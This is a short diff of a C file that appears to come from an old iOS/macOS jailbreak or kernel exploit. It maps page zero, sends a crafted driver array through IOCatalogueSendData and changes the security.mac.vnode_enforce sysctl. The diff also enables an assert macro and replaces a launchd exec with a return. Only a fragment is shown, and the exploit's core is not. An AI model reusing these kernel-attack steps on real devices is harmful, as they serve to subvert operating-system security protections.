@@ -15,8 +15,8 @@
 #include <sys/sysctl.h>
 #include <mach/mach.h>
 
-//#undef assert
-//#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)
+#undef assert
+#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)
 
 
 kern_return_t IOCatalogueSendData(mach_port_t masterPort, uint32_t flag, const char *buffer, uint32_t size);
@@ -89,6 +89,8 @@ int main() {
     assert(!mlock(patchfile, patchfile_size));
     assert(!mlock((void *) 0, 0x1000));
 
+    //execl("/sbin/lunchd", "/sbin/lunchd", NULL);
+    
     const char *str = "<array><data></data></array>";
     assert(!IOCatalogueSendData(kIOMasterPortDefault, kIOCatalogAddDrivers, str, strlen(str)));
 
@@ -100,6 +102,5 @@ int main() {
     int one = 1;
     assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));
 
-    setenv("DYLD_INSERT_LIBRARIES", "", 1);
-    execl("/sbin/launchd", "/sbin/launchd", NULL);
+    return 0;
 }
